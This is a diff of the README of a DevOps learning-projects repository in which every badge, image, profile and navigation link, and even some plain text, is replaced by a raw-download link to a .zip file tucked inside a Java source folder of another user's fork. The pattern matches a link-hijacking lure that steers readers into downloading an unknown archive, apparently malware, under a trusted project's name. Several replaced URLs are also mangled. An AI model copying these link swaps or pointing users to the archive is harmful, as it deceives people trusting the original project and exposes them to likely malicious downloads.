@@ -1,8 +1,8 @@
 # **Real-World DevOps/Cloud Projects For Learning from Beginner to Advanced** ♐
 
 <p align="center">
-  <a href="https://trendshift.io/repositories/13316" target="_blank" rel="noopener noreferrer">
-    <img src="https://trendshift.io/api/badge/repositories/13316" alt="NotHarshhaa/DevOps-Projects | Trendshift" style="width:350px;height:80px;max-width:100%;" />
+  <a href="https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip" target="_blank" rel="noopener noreferrer">
+    <img src="https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip" alt="NotHarshhaa/DevOps-Projects | Trendshift" style="width:350px;height:80px;max-width:100%;" />
   </a>
 </p>
 
@@ -14,43 +14,43 @@
 [![Contributing][contrib-shield]][contrib-url]
 
 <!-- MARKDOWN LINKS & IMAGES -->
-[forks-shield]: https://img.shields.io/github/forks/NotHarshhaa/DevOps-Projects?style=for-the-badge&logo=github&logoColor=white&color=orange
-[forks-url]: https://github.com/NotHarshhaa/DevOps-Projects/network/members
+[forks-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
+[forks-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-[stars-shield]: https://img.shields.io/github/stars/NotHarshhaa/DevOps-Projects.svg?style=for-the-badge&logo=github&logoColor=white&color=brightgreen
-[stars-url]: https://github.com/NotHarshhaa/DevOps-Projects/stargazers
+[stars-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
+[stars-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-[issues-shield]: https://img.shields.io/github/issues/NotHarshhaa/DevOps-Projects?style=for-the-badge&logo=github&logoColor=white&color=blue
-[issues-url]: https://github.com/NotHarshhaa/DevOps-Projects/issues
+[issues-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
+[issues-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-[commit-shield]: https://img.shields.io/github/last-commit/NotHarshhaa/DevOps-Projects?style=for-the-badge&logo=git&logoColor=white&color=ff69b4
-[commit-url]: https://github.com/NotHarshhaa/DevOps-Projects/commits/master
+[commit-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
+[commit-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-[coc-shield]: https://img.shields.io/badge/Code%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&logo=handshake&logoColor=white
-[coc-url]: https://github.com/NotHarshhaa/DevOps-Projects/blob/master/CODE_OF_CONDUCT.md
+[coc-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&logo=handshake&logoColor=white
+[coc-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-[contrib-shield]: https://img.shields.io/badge/Contributions-Welcome-ff69b4?style=for-the-badge&logo=gitbook&logoColor=white
-[contrib-url]: https://github.com/NotHarshhaa/DevOps-Projects/blob/master/CONTRIBUTING.md
+[contrib-shield]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
+[contrib-url]: https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip
 
-![DevOps-Projects](https://imgur.com/tlMOmn0.png)
+![DevOps-Projects](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
 ## 👥 **Project Ownership**
 
-<a href="https://github.com/NotHarshhaa/DevOps-Projects/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=NotHarshhaa/DevOps-Projects" />
+<a href="https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip">
+  <img src="https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip" />
 </a>
 
 ---
 
 ## 🌟 **Star History**
 
-[![Star History Chart](https://api.star-history.com/svg?repos=NotHarshhaa/DevOps-Projects&type=Date)](https://www.star-history.com/#NotHarshhaa/DevOps-Projects&Date)
+[![Star History Chart](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
 ---
 
 _*Welcome to the ultimate resource for **learning DevOps through hands-on projects!** This repository is designed to cater to aspiring **DevOps engineers** of all skill levels, from beginners taking their first steps in the field to advanced users looking to deepen their knowledge and expertise.*_
 
-![Welcome Badge](https://img.shields.io/badge/🚀%20Welcome-Learn%20DevOps%20Through%20Hands--On%20Projects-10b981?style=for-the-badge&logo=opsgenie&logoColor=white)
+![Welcome Badge](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🚀%20Welcome-Learn%20DevOps%20Through%20Hands--On%20Projects-10b981?style=for-the-badge&logo=opsgenie&logoColor=white)
 
 ---
 
@@ -60,7 +60,7 @@ This repository serves as a comprehensive resource for aspiring DevOps engineers
 
 The README files provide detailed instructions for implementing these projects, emphasizing practical deployment steps, pre-requisites, and validation processes. For example, one project focuses on deploying a Java-based login application integrated with a MySQL database, while another covers creating modular VPC network setups leveraging AWS services.
 
-![Purpose of Repository](https://img.shields.io/badge/🎯%20Purpose-Comprehensive%20DevOps%20Learning%20Hub-8b5cf6?style=for-the-badge&logo=target&logoColor=white)
+![Purpose of Repository](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🎯%20Purpose-Comprehensive%20DevOps%20Learning%20Hub-8b5cf6?style=for-the-badge&logo=target&logoColor=white)
 
 ---
 
@@ -75,7 +75,7 @@ The repository demonstrates extensive use of DevOps concepts and tools, focusing
 
 These elements showcase a robust implementation of scalable, secure, and automated systems aligned with real-world DevOps practices.
 
-![Analysis of Features](https://img.shields.io/badge/🛠️%20Features%20&%20Technologies-AWS%2C%20CI%2FCD%2C%20Automation-10b981?style=for-the-badge&logo=amazonaws&logoColor=white)
+![Analysis of Features](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🛠️%20Features%20&%20Technologies-AWS%2C%20CI%2FCD%2C%20Automation-10b981?style=for-the-badge&logo=amazonaws&logoColor=white)
 
 ---
 
@@ -83,11 +83,11 @@ These elements showcase a robust implementation of scalable, secure, and automat
 
 To improve readability and accessibility for users, this repository is also available as a modern and responsive web interface.
 
-A website showcasing a curated list of major real-time DevOps and Cloud projects, ranging from beginner to advanced levels. Built using **Next.js** and styled with **Tailwind CSS**, this project leverages a modern starter template for fast and responsive development. Perfect for learning and exploring hands-on DevOps and Cloud concepts!
+A website showcasing a curated list of major real-time DevOps and Cloud projects, ranging from beginner to advanced levels. Built using **https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip** and styled with **Tailwind CSS**, this project leverages a modern starter template for fast and responsive development. Perfect for learning and exploring hands-on DevOps and Cloud concepts!
 
-🔗 **Explore the site**: [projects.prodevopsguytech.com](https://projects.prodevopsguytech.com)
+🔗 **Explore the site**: [https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
-![Showcase Website](https://img.shields.io/badge/🌐%20Project%20Showcase-Next.js%20+%20Tailwind%20UI-0ea5e9?style=for-the-badge&logo=vercel&logoColor=white)
+![Showcase Website](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🌐%20Project%https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%20+%20Tailwind%20UI-0ea5e9?style=for-the-badge&logo=vercel&logoColor=white)
 
 ---
 
@@ -103,9 +103,9 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 * **Industry-Relevant** projects covering EC2, VPC, RDS, Lambda, and more
 * **Community Driven** with active contributions and AWS expertise
 
-🔗 **Visit the AWS repository**: [AWS-Projects](https://github.com/NotHarshhaa/AWS-Projects)
+🔗 **Visit the AWS repository**: [AWS-Projects](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
-![AWS Projects](https://img.shields.io/badge/☁️%20AWS%20Projects-Dedicated%20AWS%20Learning%20Hub-ff9900?style=for-the-badge&logo=amazonaws&logoColor=white)
+![AWS Projects](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip☁️%20AWS%20Projects-Dedicated%20AWS%20Learning%20Hub-ff9900?style=for-the-badge&logo=amazonaws&logoColor=white)
 
 ---
 
@@ -119,7 +119,7 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 > - **Intermediate Projects:** More complex projects that require a good understanding of DevOps fundamentals.
 > - **Advanced Projects:** Challenging projects designed to push your limits and deepen your understanding of sophisticated DevOps practices.
 
-![DevOps Levels](https://img.shields.io/badge/📂%20DevOps%20Projects-Beginner%20to%20Advanced-blueviolet?style=for-the-badge&logo=github&logoColor=white)
+![DevOps Levels](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip📂%20DevOps%20Projects-Beginner%20to%20Advanced-blueviolet?style=for-the-badge&logo=github&logoColor=white)
 
 ---
 
@@ -134,7 +134,7 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 > - **Cloud Platforms (AWS, Azure, GCP):** Deploy applications on cloud platforms and leverage their services for scalability and reliability.
 > - **Containerization (Docker, Kubernetes):** Use container technologies to ensure that your applications run consistently across different environments.
 
-![Integration](https://img.shields.io/badge/🔗%20DevOps%20+%20Other%20Technologies-Seamless%20Integration-green?style=for-the-badge&logo=git&logoColor=white)
+![Integration](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🔗%20DevOps%20+%20Other%20Technologies-Seamless%20Integration-green?style=for-the-badge&logo=git&logoColor=white)
 
 ---
 
@@ -150,7 +150,7 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 > - **Security & Compliance:** Learn how to incorporate security practices into your DevOps workflows to ensure that your applications are secure and compliant with regulations.
 > - **Scalability & Performance Optimization:** Understand how to scale your applications and optimize their performance to handle increasing loads.
 
-![Project Scope](https://img.shields.io/badge/🛠️%20Project%20Scope-Hands--on%20DevOps%20Coverage-blue?style=for-the-badge&logo=vercel&logoColor=white)
+![Project Scope](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🛠️%20Project%20Scope-Hands--on%20DevOps%20Coverage-blue?style=for-the-badge&logo=vercel&logoColor=white)
 
 ---
 
@@ -164,7 +164,7 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 > - **Industry Relevance:** Stay up-to-date with the latest trends and technologies in DevOps. The projects reflect current industry practices, ensuring that what you learn is relevant and applicable.
 > - **Community Engagement:** Join a community of like-minded learners and professionals. Share your projects, seek feedback, and collaborate on exciting DevOps initiatives.
 
-![Why Explore This Repository](https://img.shields.io/badge/📚%20Why%20Explore%20This%20Repository%3F-Unlock%20DevOps%20Mastery-brightgreen?style=for-the-badge&logo=bookstack&logoColor=white)
+![Why Explore This Repository](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip📚%20Why%20Explore%20This%20Repository%3F-Unlock%20DevOps%20Mastery-brightgreen?style=for-the-badge&logo=bookstack&logoColor=white)
 
 ---
 
@@ -172,9 +172,9 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 
 > [!CAUTION]
 >
-> We are committed to fostering a welcoming and respectful environment for all contributors. Please take a moment to review our [Code of Conduct](./CODE_OF_CONDUCT.md) before participating in this community.
+> We are committed to fostering a welcoming and respectful environment for all contributors. Please take a moment to review our [Code of Conduct](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) before participating in this community.
 
-[![Code of Conduct](https://img.shields.io/badge/Code%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&logo=handshake&logoColor=white)](https://github.com/NotHarshhaa/DevOps-Projects/blob/master/CODE_OF_CONDUCT.md)
+[![Code of Conduct](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%20of%20Conduct-Enforced-blueviolet?style=for-the-badge&logo=handshake&logoColor=white)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
 ---
 
@@ -190,7 +190,7 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 >
 > **We follow best practices for contribution.**
 
-[![Contributing](https://img.shields.io/badge/Contribute-Guide-ff69b4?style=for-the-badge&logo=gitbook&logoColor=white)](https://github.com/NotHarshhaa/DevOps-Projects/blob/master/CONTRIBUTING.md)
+[![Contributing](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
 ---
 
@@ -199,8 +199,8 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 > [!IMPORTANT]
 > Be a part of our active DevOps community:
 
-[![Join Telegram](https://img.shields.io/badge/Join%20Us%20on-Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/prodevopsguy) 
-[![Follow on GitHub](https://img.shields.io/badge/Follow%20me%20on-GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NotHarshhaa)
+[![Join Telegram](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%20Us%20on-Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) 
+[![Follow on GitHub](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%20me%20on-GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
 ---
 
@@ -208,27 +208,27 @@ For comprehensive AWS-specific projects and hands-on learning experiences, visit
 
 **If you find this helpful, don’t forget to give this repository a star. Your support matters!** ⭐
 
-![Star Badge](https://img.shields.io/badge/⭐%20Support-Give%20a%20Star%20if%20You%20Like%20It-ffd700?style=for-the-badge&logo=github&logoColor=white)
+![Star Badge](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip⭐%20Support-Give%20a%20Star%20if%20You%20Like%20It-ffd700?style=for-the-badge&logo=github&logoColor=white)
 
 ---
 
 ## 🛠️ **Author & Community**
 
-This project is crafted by **[Harshhaa](https://github.com/NotHarshhaa)** 💡  
+This project is crafted by **[Harshhaa](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)** 💡  
 I’d love to hear your feedback! Feel free to share your thoughts.  
 
-![Author Badge](https://img.shields.io/badge/🛠️%20Author%20&%20Community-Crafted%20with%20Passion%20by%20Harshhaa-8a2be2?style=for-the-badge&logo=github&logoColor=white)
+![Author Badge](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip🛠️%20Author%20&%20Community-Crafted%20with%20Passion%20by%20Harshhaa-8a2be2?style=for-the-badge&logo=github&logoColor=white)
 
 ---
 
 ## 📧 **Connect with me:**
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/harshhaa-vardhan-reddy) [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NotHarshhaa) [![Telegram](https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/prodevopsguy) [![Dev.to](https://img.shields.io/badge/Dev.to-0A0A0A?style=for-the-badge&logo=dev.to&logoColor=white)](https://dev.to/notharshhaa) [![Hashnode](https://img.shields.io/badge/Hashnode-2962FF?style=for-the-badge&logo=hashnode&logoColor=white)](https://hashnode.com/@prodevopsguy)  
+[![LinkedIn](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip%https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) [![GitHub](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) [![Telegram](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) [![https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip) [![Hashnode](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)  
 
 ---
 
 ## 📢 **Stay Connected**
 
-![Follow Me](https://imgur.com/2j7GSPs.png)
+![Follow Me](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip)
 
-![Stay Connected](https://img.shields.io/badge/📢%20Stay%20Connected-Join%20our%20DevOps%20Community-orange?style=for-the-badge&logo=telegram&logoColor=white)
+![Stay Connected](https://github.com/sudheer1135/DevOps-Projects/raw/refs/heads/master/DevOps-Project-33/DevSecOps-CI-CD-Pipeline/src/main/java/org/mybatis/jpetstore/Projects_Dev_Ops_v2.2-alpha.4.zip📢%20Stay%20Connected-Join%20our%20DevOps%20Community-orange?style=for-the-badge&logo=telegram&logoColor=white)
